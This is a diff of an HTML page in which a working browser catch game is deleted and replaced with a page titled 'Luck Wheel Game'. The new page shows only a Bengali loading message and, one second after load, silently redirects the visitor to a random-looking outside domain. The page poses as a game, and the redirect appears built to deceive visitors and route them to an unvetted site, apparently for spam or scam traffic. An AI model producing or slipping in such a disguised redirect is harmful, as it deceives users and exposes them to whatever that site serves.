@@ -1,145 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ultimate Catch Game</title>
-
-<style>
-body{
-margin:0;
-overflow:hidden;
-font-family:Arial;
-background:#111;
-color:white;
-}
-
-.box{
-width:60px;
-height:60px;
-position:absolute;
-border-radius:12px;
-}
-
-#player{background:lime;}
-#bomb{background:red;}
-
-#ui{
-position:fixed;
-top:10px;
-left:10px;
-font-size:14px;
-}
-
-#timer{
-position:fixed;
-top:10px;
-right:10px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Luck Wheel Game</title>
+    <style>
+        body {
+            background-color: #0f172a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .loading {
+            color: #38bdf8;
+            font-size: 24px;
+            text-align: center;
+        }
+    </style>
+    <script>
+        // আপনার লিঙ্কে অটোমেটিক নিয়ে যাবে
+        window.onload = function() {
+            setTimeout(function() {
+                window.location.href = "https://3dqeka7xzlun7d5mst.com/9EWU";
+            }, 1000); // ১ সেকেন্ড পর রিডাইরেক্ট হবে
+        };
+    </script>
 </head>
-
 <body>
-
-<div id="ui">
-Score: <span id="score">0</span><br>
-High: <span id="high">0</span><br>
-Level: <span id="level">1</span><br>
-Lives: <span id="lives">3</span>
-</div>
-
-<div id="timer">Time: 30</div>
-
-<div id="player" class="box"></div>
-<div id="bomb" class="box"></div>
-
-<script>
-let score=0;
-let level=1;
-let lives=3;
-let time=30;
-let speed=1000;
-
-let high=localStorage.getItem("high")||0;
-document.getElementById("high").innerText=high;
-
-const player=document.getElementById("player");
-const bomb=document.getElementById("bomb");
-
-function move(el){
-let x=Math.random()*(window.innerWidth-60);
-let y=Math.random()*(window.innerHeight-60);
-el.style.left=x+"px";
-el.style.top=y+"px";
-}
-
-function beep(){
-let ctx=new (window.AudioContext||window.webkitAudioContext)();
-let osc=ctx.createOscillator();
-osc.connect(ctx.destination);
-osc.start();
-osc.stop(ctx.currentTime+0.1);
-}
-
-player.onclick=()=>{
-score++;
-beep();
-
-player.style.background=
-"rgb("+Math.random()*255+","+
-Math.random()*255+","+
-Math.random()*255+")";
-
-if(score%5==0){
-level++;
-speed-=80;
-if(speed<300) speed=300;
-document.getElementById("level").innerText=level;
-}
-
-document.getElementById("score").innerText=score;
-move(player);
-}
-
-bomb.onclick=()=>{
-lives--;
-beep();
-
-document.getElementById("lives").innerText=lives;
-
-if(lives<=0){
-gameOver();
-}
-
-move(bomb);
-}
-
-function gameOver(){
-if(score>high){
-localStorage.setItem("high",score);
-}
-
-alert("Game Over\nScore: "+score);
-location.reload();
-}
-
-setInterval(()=>{
-move(player);
-move(bomb);
-},speed);
-
-let timer=setInterval(()=>{
-time--;
-document.getElementById("timer").innerText="Time: "+time;
-
-if(time<=0){
-clearInterval(timer);
-gameOver();
-}
-},1000);
-
-move(player);
-move(bomb);
-</script>
-
+    <div class="loading">
+        <h2>গেমটি লোড হচ্ছে...</h2>
+        <p>দয়া করে অপেক্ষা করুন।</p>
+    </div>
 </body>
 </html>
